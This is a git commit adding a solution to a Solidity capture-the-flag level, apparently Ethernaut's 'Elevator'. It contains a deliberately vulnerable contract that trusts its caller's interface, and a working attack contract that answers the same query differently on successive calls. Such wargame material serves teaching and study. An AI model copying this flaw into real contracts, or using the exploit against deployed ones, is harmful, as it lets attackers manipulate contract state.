a4ea54e6afbd911ffc3087f4d2d5216ab2195653
0xEval <0xeval@pm.me>
2022-03-23 11:42:59 +0800

    📝 Adding solution to Level 11 (Elevator)

---
+++ src/levels/11-Elevator/Elevator.sol
@@ -0,0 +1,24 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.10;
+
+// Objective:
+// Reach the last floor of the Building!
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
---
+++ src/levels/11-Elevator/ElevatorAttack.sol
@@ -0,0 +1,21 @@
+//SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.10;
+
+import './Elevator.sol';
+
+contract ElevatorAttack {
+    Elevator targetContract;
+
+    constructor(address _targetAddress) {
+        targetContract = Elevator(_targetAddress);
+    }
+
+    function isLastFloor(uint256 _floor) external view returns (bool) {
+        return targetContract.floor() == _floor;
+    }
+
+    function attack() external {
+        targetContract.goTo(1);
+    }
+}
